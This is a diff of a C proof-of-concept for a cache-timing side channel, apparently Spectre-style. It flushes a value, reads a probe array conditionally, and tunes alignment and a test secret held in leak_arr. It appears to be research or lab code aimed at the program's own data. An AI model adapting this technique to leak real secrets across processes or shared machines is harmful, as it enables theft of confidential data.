@@ -17,10 +17,10 @@
 #define DBG 0
 #define MALLOC_SIZE 4096
 
-int INIT_VALUE;
+int __attribute__ ((aligned (256)))INIT_VALUE;
 
-cp_t* flush_reload_arr;
 int leak_arr[SECRET_SIZE];
+cp_t* flush_reload_arr;
 
 __attribute__((noinline)) void init_func(int* arr, int length) {
     arr[0] = INIT_VALUE;
@@ -30,7 +30,7 @@ __attribute__((noinline)) void init_func(int* arr, int length) {
 __attribute__((noinline)) void read_func(int* arr, int index) {
 
     flush((void*)&INIT_VALUE);
-
+    volatile cp_t cp = flush_reload_arr[0];
     if(arr[0] == INIT_VALUE) {
         volatile cp_t cp = flush_reload_arr[arr[index]];
     }
@@ -71,11 +71,11 @@ int main(int argc, char** argv) {
     leak_arr[0] = 'c';
     leak_arr[1] = 'h';
     leak_arr[2] = 'r';
-    leak_arr[3] = 'i';
+    /*leak_arr[3] = 'i';
     leak_arr[4] = 's';
     leak_arr[5] = 'w';
     leak_arr[6] = 'a';
-    leak_arr[7] = 'g';
+    leak_arr[7] = 'g';*/
     srand(time(0));
     int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints
     printf("results[REP=%d][SECRET=%d][N_PAGES=%d]\n", REPETITIONS, SECRET_SIZE, N_PAGES);
